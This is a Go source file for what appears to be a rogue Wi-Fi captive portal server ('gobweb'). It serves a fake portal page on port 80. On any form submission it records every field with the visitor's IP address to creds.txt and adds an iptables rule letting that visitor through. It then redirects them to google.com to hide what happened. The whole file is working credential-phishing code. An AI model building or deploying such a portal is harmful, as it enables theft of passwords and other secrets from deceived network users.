package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

var indexFilePath = "/"

type NotFoundRedirectRespWr struct {
	http.ResponseWriter // We embed http.ResponseWriter
	status int
}

func (w *NotFoundRedirectRespWr) WriteHeader(status int) {
	w.status = status // Store the status for our own use
	if status != http.StatusNotFound {
		w.ResponseWriter.WriteHeader(status)
	}
}

func (w *NotFoundRedirectRespWr) Write(p []byte) (int, error) {
	if w.status != http.StatusNotFound {
		return w.ResponseWriter.Write(p)
	}
	return len(p), nil // Lie that we successfully written it
}

func redirectTo(w http.ResponseWriter, r *http.Request, url string) {
	log.Printf("Redirecting %v to %v", r.RequestURI, url)
	w.Header().Set("Location", url)
	w.WriteHeader(301)
	body := "Redirecting..."
	w.Header().Set("Content-Length", fmt.Sprintf("%v", len([]rune(body))))
	w.Write([]byte(body))
}

func redirect(w http.ResponseWriter, r *http.Request) {
	redirectTo(w, r, indexFilePath)
}

func login(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()

	if err != nil {
		fmt.Printf("[+] Unable to parse form\n")
		redirect(w, r)
		return
	}

	ip := strings.Split(r.RemoteAddr, ":")[0]

	var captured []string

	for key, value := range r.Form {
		if len(value) == 0 {
			fmt.Printf("[+] Empty value array for key %v in form\n", key)
			redirect(w, r)
			return
		}
		input := value[0]
		if len(strings.TrimSpace(input)) == 0 {
			fmt.Printf("[+] Empty form field for key %v\n", key)
			redirect(w, r)
			return
		}
		captured = append(captured, fmt.Sprintf("'%v'='%v'", key, input))
	}

	record := "[" + r.RequestURI + "]" + strings.Join(captured, ", ")

	/* iptables whitelist */
	cmd := exec.Command("iptables", "-t", "nat", "-I", "GOBWEB", "-s", ip, "-j", "RETURN")
	_, err = cmd.Output()

	if err != nil {
		fmt.Printf("[+] iptables whitelist error\n")
		panic(err)
	}

	fo, err := os.OpenFile("creds.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0666)
	defer fo.Close()

	if err != nil {
		fmt.Printf("[+] File open error!\n")
		panic(err)
	}

	fo.WriteString(record + "\n")

	fmt.Printf("[+] %v\n", record)

	redirectTo(w, r, "https://google.com/")
	//fmt.Fprint(w, "<script> setTimeout(function() { window.location.replace(\"https://google.com/\"); }, 3000) </script>")
}

func wrapHandler(h http.Handler) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			fmt.Printf("[+] Handling post request to %v\n", r.RequestURI)
			login(w, r)
			return
		}
		nfrw := &NotFoundRedirectRespWr{ResponseWriter: w}
		h.ServeHTTP(nfrw, r)
		if nfrw.status == 404 {
			redirect(w, r)
		}
	}
}

func main() {
	if len(os.Args) < 2 || len(os.Args) > 3 {
		log.Printf("Usage: %v <portal_directory> [index_file_path]", os.Args[0])
	}
	dir := "site/" + os.Args[1]
	src, err := os.Stat(dir)

	if os.IsNotExist(err) {
		log.Fatal("Error: portal directory does not exist")
		return
	}

	if src.Mode().IsRegular() {
		log.Fatal("Error: portal directory is a regular file")
		return
	}


	if len(os.Args) == 3 {
		indexFilePath += os.Args[2]
	} else {
		indexFilePath += "index.html"
	}

	src, err = os.Stat(dir + "/" + indexFilePath)

	if os.IsNotExist(err) {
		log.Fatal("Error: index file does not exist")
		return
	}

	if !src.Mode().IsRegular() {
		log.Fatal("Error: index file should be a regular file")
		return
	}


	log.Println("gobweb started")
	log.Println("Index file is " + indexFilePath)
	log.Println("Static files directory is " + dir)
	fs := wrapHandler(http.FileServer(http.Dir(dir)))
	http.Handle("/", fs)
	log.Fatal(http.ListenAndServe(":80", nil))
}
